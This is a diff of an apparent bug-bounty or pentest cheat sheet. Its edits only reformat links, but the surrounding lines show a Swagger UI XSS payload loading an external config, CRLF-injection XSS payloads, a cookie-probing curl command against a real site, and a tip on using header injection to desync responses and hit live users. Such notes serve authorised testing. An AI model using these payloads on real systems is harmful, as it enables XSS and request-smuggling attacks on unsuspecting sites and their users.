@@ -369,7 +369,7 @@ done <$file
   `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUyUyMGFsbCUyMHRoZSUyMHRoaW5ncy9zd2FnLXRlc3QueWFtbCIKfQ==`
 - Nuclei template `%USERPROFILE%\nuclei-templates\exposures\apis\swagger-api.yaml`
 
-**CRLF injection** [[Reference]](https://www.acunetix.com/websitesecurity/crlf-injection/)
+**CRLF injection** [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)]
 - `/%0D%0AX-XSS-Protection%3A%200%0A%0A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - `/%E5%98%8D%E5%98%8AX-XSS-Protection%3A%200%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%3cscript%3ealert(document.domain)%3c%2fscript%3e%3c!--`
 - Nuclei template `%USERPROFILE%\nuclei-templates\vulnerabilities\generic\crlf-injection.yaml`
@@ -598,7 +598,9 @@ Burp extensions:
 
 - "If someone sends a cookie called '0', automattic.com responds with a list of all 152 cookies supported by the application:
 curl -v -H 'Cookie: 0=1' https://automattic.com/?cb=123 | fgrep Cookie" [[Reference](https://hackerone.com/reports/310105)];
-- CRLF injection [[Reference]](https://www.acunetix.com/websitesecurity/crlf-injection/), "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
+- CRLF injection [[Reference](https://www.acunetix.com/websitesecurity/crlf-injection/)], "When you find response header injection, you can probably do better than mere XSS or open-redir. Try injecting a short Content-Length header to cause a reverse desync and exploit random live users." [[Reference](https://twitter.com/albinowax/status/1412778191119396864)]
+
+<hr/>
 
 ### DLL Hijacking
 
